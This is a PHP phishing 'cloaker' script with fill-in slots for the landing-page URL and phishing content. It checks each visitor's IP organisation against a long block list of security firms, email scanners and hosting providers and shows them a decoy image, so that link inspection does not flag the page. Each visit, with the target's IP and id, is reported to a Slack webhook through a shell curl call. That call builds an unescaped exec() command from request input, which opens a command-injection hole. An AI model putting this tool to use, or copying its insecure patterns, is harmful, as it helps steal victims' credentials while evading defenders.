<?php

// Enter Your Phishing URL Below
$url = "URL OF YOUR LANDING PAGE HERE";

$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$org = $details->org;

// List of Orgs to be Blacklisted
$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754");

if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m)) {
// Content for Orgs to see on the Blacklist
echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
$allowed = "- *Jedi Mind Trick Successful* -";

} else {





// PUT YOUR PHISHING CONTENT WITHIN THESE ELSE BRACKETS!!!!





$allowed = "- *Jedi Mind Trick Not Successful* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

// Set Slack Information Here
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#phishing", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/YOUR_SLACK_WEBOOK_HERE';
//echo $cmd;
exec($cmd);

// You Can Uncomment If You Want to Use a Database to Capture Requests (ask me for stored procedure)
//$conn = mysqli_connect('127.0.0.1', 'USERNAME', 'PASSWORD', 'phishbypass');
//// Check connection
//if ($conn->connect_error) {
//    die("Connection failed: " . $conn->connect_error);
//}

//$sql = "CALL InsertData('$ip','$id','$org','$jedi','$url');";
//$result = $conn->query($sql);

//printf($conn->error);
//$conn->close();


?>
